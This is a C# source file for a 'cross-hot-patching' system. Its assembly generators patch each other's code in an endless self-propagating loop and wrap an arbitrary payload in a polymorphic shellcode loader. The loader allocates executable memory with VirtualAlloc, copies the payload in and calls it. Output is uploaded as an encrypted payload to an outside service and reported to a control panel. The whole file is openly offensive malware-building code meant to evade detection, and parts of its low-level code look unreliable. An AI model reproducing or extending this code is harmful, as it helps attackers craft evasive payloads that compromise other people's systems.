using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using AssemblyGenerators;
using PanelIntegration;
using OceanDigital;
using GitStorage;

namespace CrossHotPatcher
{
    public class CrossHotPatcher
    {
        private readonly List<AsmGenerator> _generators;
        private readonly PanelConnector _panelConnector;
        private readonly OceanDigitalConnector _oceanConnector;
        private readonly GitStorageManager _gitStorage;
        private readonly Random _random;

        public CrossHotPatcher(PanelConnector panelConnector, OceanDigitalConnector oceanConnector, GitStorageManager gitStorage)
        {
            _generators = new List<AsmGenerator>();
            _panelConnector = panelConnector;
            _oceanConnector = oceanConnector;
            _gitStorage = gitStorage;
            _random = new Random();

            InitializeGenerators();
        }

        private void InitializeGenerators()
        {
            // Create multiple assembly generators
            var generatorConfigs = new[]
            {
                new { Name = "GeneratorX64", Arch = "x64" },
                new { Name = "GeneratorX86", Arch = "x86" },
                new { Name = "GeneratorARM64", Arch = "arm64" },
                new { Name = "GeneratorHybrid", Arch = "x64" }
            };

            foreach (var config in generatorConfigs)
            {
                var generator = new AsmGenerator(config.Name, config.Arch, _panelConnector);
                _generators.Add(generator);
            }

            Console.WriteLine($"Initialized {_generators.Count} assembly generators");
        }

        // Start the cross-hot-patching system
        public async Task StartCrossHotPatching()
        {
            Console.WriteLine("=== Starting Cross-Hot-Patching System ===");
            
            // Send status to panel
            await _panelConnector.SendStatusUpdate("cross_hot_patching_started", new Dictionary<string, object>
            {
                ["generator_count"] = _generators.Count,
                ["timestamp"] = DateTime.UtcNow
            });

            // Start the self-propagating loop
            _ = Task.Run(async () => await SelfPropagatingLoop());
        }

        // Self-propagating loop where generators patch each other
        private async Task SelfPropagatingLoop()
        {
            while (true)
            {
                try
                {
                    // Generate fresh assembly from each generator
                    var generationTasks = _generators.Select(async generator =>
                    {
                        var assemblyCode = await generator.GenerateAssembly(_random.Next(50, 200));
                        var compiledCode = await generator.CompileAssembly(assemblyCode);
                        
                        // Store in Git
                        var metadata = new Dictionary<string, object>
                        {
                            ["generator_name"] = generator.Name,
                            ["target_arch"] = generator.TargetArchitecture,
                            ["instruction_count"] = generator.GeneratedInstructions.Count,
                            ["compiled_size"] = compiledCode.Length
                        };
                        
                        await _gitStorage.StoreAssemblyCode(generator.Name, assemblyCode, metadata);
                        
                        return new { Generator = generator, AssemblyCode = assemblyCode, CompiledCode = compiledCode };
                    });

                    var generationResults = await Task.WhenAll(generationTasks);

                    // Cross-patch generators
                    await CrossPatchGenerators(generationResults);

                    // Send status update
                    await _panelConnector.SendStatusUpdate("generation_cycle_complete", new Dictionary<string, object>
                    {
                        ["generated_count"] = generationResults.Length,
                        ["timestamp"] = DateTime.UtcNow
                    });

                    // Wait before next cycle
                    await Task.Delay(TimeSpan.FromSeconds(_random.Next(30, 120)));
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error in self-propagating loop: {ex.Message}");
                    await _panelConnector.SendStatusUpdate("error", new Dictionary<string, object>
                    {
                        ["error"] = ex.Message,
                        ["timestamp"] = DateTime.UtcNow
                    });
                    
                    await Task.Delay(TimeSpan.FromSeconds(60));
                }
            }
        }

        // Cross-patch generators with each other's code
        private async Task CrossPatchGenerators(dynamic[] generationResults)
        {
            Console.WriteLine("=== Starting Cross-Patching ===");

            for (int i = 0; i < _generators.Count; i++)
            {
                var sourceGenerator = _generators[i];
                var sourceResult = generationResults[i];

                // Select random target generators (excluding self)
                var targetGenerators = _generators.Where((g, index) => index != i).ToList();
                var targetCount = _random.Next(1, Math.Min(3, targetGenerators.Count + 1));

                for (int j = 0; j < targetCount; j++)
                {
                    var targetGenerator = targetGenerators[_random.Next(targetGenerators.Count)];
                    targetGenerators.Remove(targetGenerator); // Avoid duplicate targets

                    await CrossPatchGenerator(sourceGenerator, targetGenerator, sourceResult.CompiledCode);
                }
            }
        }

        // Patch one generator with another's code
        private async Task CrossPatchGenerator(AsmGenerator sourceGenerator, AsmGenerator targetGenerator, byte[] patchData)
        {
            try
            {
                // Select random car marker from target
                var availableMarkers = targetGenerator.HotPatchMarkers.Keys.ToList();
                if (availableMarkers.Count == 0)
                {
                    // Generate some markers if none exist
                    for (int i = 1; i <= 5; i++)
                    {
                        var markerName = $"car_marker_{i}";
                        var fakeAddress = new IntPtr(_random.Next(0x10000000, 0x7FFFFFFF));
                        targetGenerator.RegisterHotPatchMarker(markerName, fakeAddress);
                        availableMarkers.Add(markerName);
                    }
                }

                var targetMarker = availableMarkers[_random.Next(availableMarkers.Count)];

                // Create patch from source generator's compiled code
                var patchSize = Math.Min(patchData.Length, 64); // Limit patch size
                var patchBytes = new byte[patchSize];
                Array.Copy(patchData, 0, patchBytes, 0, patchSize);

                // Apply the patch
                var patchName = $"{sourceGenerator.Name}_to_{targetGenerator.Name}_{DateTime.UtcNow:HHmmss}";
                var success = await targetGenerator.ApplyHotPatch(patchName, targetMarker, patchBytes);

                // Store patch in Git
                var patchMetadata = new Dictionary<string, object>
                {
                    ["source_generator"] = sourceGenerator.Name,
                    ["target_generator"] = targetGenerator.Name,
                    ["target_marker"] = targetMarker,
                    ["patch_size"] = patchSize,
                    ["success"] = success,
                    ["timestamp"] = DateTime.UtcNow
                };

                await _gitStorage.StoreHotPatch(patchName, patchBytes, patchMetadata);

                // Send to Ocean Digital
                await _oceanConnector.SendHotPatchEvent("cross_patch", new Dictionary<string, object>
                {
                    ["source"] = sourceGenerator.Name,
                    ["target"] = targetGenerator.Name,
                    ["marker"] = targetMarker,
                    ["success"] = success,
                    ["patch_size"] = patchSize
                });

                Console.WriteLine($"Cross-patch: {sourceGenerator.Name} -> {targetGenerator.Name} ({targetMarker}) - {(success ? "SUCCESS" : "FAILED")}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to cross-patch {sourceGenerator.Name} -> {targetGenerator.Name}: {ex.Message}");
            }
        }

        // Generate polymorphic payload with cross-patched generators
        public async Task<byte[]> GeneratePolymorphicPayload(byte[] originalPayload)
        {
            try
            {
                Console.WriteLine("=== Generating Polymorphic Payload ===");

                // Select random generator
                var generator = _generators[_random.Next(_generators.Count)];
                
                // Generate assembly wrapper
                var assemblyCode = await generator.GenerateAssembly(_random.Next(100, 300));
                
                // Add payload injection code
                var payloadInjectionCode = GeneratePayloadInjectionCode(originalPayload);
                assemblyCode += "\n" + payloadInjectionCode;

                // Compile the polymorphic wrapper
                var compiledCode = await generator.CompileAssembly(assemblyCode);

                // Store in Git
                var metadata = new Dictionary<string, object>
                {
                    ["original_payload_size"] = originalPayload.Length,
                    ["generator_name"] = generator.Name,
                    ["target_arch"] = generator.TargetArchitecture,
                    ["polymorphic_size"] = compiledCode.Length,
                    ["timestamp"] = DateTime.UtcNow
                };

                await _gitStorage.StoreAssemblyCode($"polymorphic_{generator.Name}", assemblyCode, metadata);

                // Upload to Ocean Digital
                var fileName = $"polymorphic_payload_{DateTime.UtcNow:yyyyMMdd_HHmmss}.bin";
                var fileId = await _oceanConnector.UploadEncryptedPayload(fileName, compiledCode, metadata);

                Console.WriteLine($"Generated polymorphic payload: {compiledCode.Length} bytes (Ocean ID: {fileId})");

                return compiledCode;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to generate polymorphic payload: {ex.Message}");
                throw;
            }
        }

        private string GeneratePayloadInjectionCode(byte[] payload)
        {
            var sb = new System.Text.StringBuilder();
            sb.AppendLine("; Payload injection code");
            sb.AppendLine("payload_injection:");
            sb.AppendLine("    ; Allocate memory for payload");
            sb.AppendLine("    mov rcx, 0x1000");
            sb.AppendLine("    mov rdx, 0x1000");
            sb.AppendLine("    mov r8, 0x40");
            sb.AppendLine("    call VirtualAlloc");
            sb.AppendLine("    ; Copy payload");
            sb.AppendLine($"    mov rsi, payload_data");
            sb.AppendLine("    mov rdi, rax");
            sb.AppendLine($"    mov rcx, {payload.Length}");
            sb.AppendLine("    rep movsb");
            sb.AppendLine("    ; Execute payload");
            sb.AppendLine("    call rax");
            sb.AppendLine("    ret");
            sb.AppendLine("payload_data:");
            
            // Add payload as hex bytes
            for (int i = 0; i < payload.Length; i += 16)
            {
                var line = "    db ";
                for (int j = 0; j < 16 && i + j < payload.Length; j++)
                {
                    if (j > 0) line += ", ";
                    line += $"0x{payload[i + j]:X2}";
                }
                sb.AppendLine(line);
            }

            return sb.ToString();
        }

        // Get system status
        public async Task<Dictionary<string, object>> GetSystemStatus()
        {
            var status = new Dictionary<string, object>
            {
                ["generators"] = _generators.Count,
                ["generator_names"] = _generators.Select(g => g.Name).ToArray(),
                ["total_instructions"] = _generators.Sum(g => g.GeneratedInstructions.Count),
                ["hot_patch_markers"] = _generators.Sum(g => g.HotPatchMarkers.Count),
                ["timestamp"] = DateTime.UtcNow
            };

            // Add Git status
            var gitStatus = _gitStorage.GetRepositoryStatus();
            status["git_status"] = new Dictionary<string, object>
            {
                ["current_branch"] = gitStatus.CurrentBranch,
                ["uncommitted_changes"] = gitStatus.UncommittedChanges,
                ["total_commits"] = gitStatus.TotalCommits,
                ["has_remote"] = gitStatus.HasRemote
            };

            return status;
        }

        // Stop the system
        public async Task StopSystem()
        {
            Console.WriteLine("=== Stopping Cross-Hot-Patching System ===");
            
            await _panelConnector.SendStatusUpdate("system_stopping", new Dictionary<string, object>
            {
                ["timestamp"] = DateTime.UtcNow
            });

            // Store final system logs
            var finalStatus = await GetSystemStatus();
            await _gitStorage.StoreSystemLogs(finalStatus);
        }
    }
}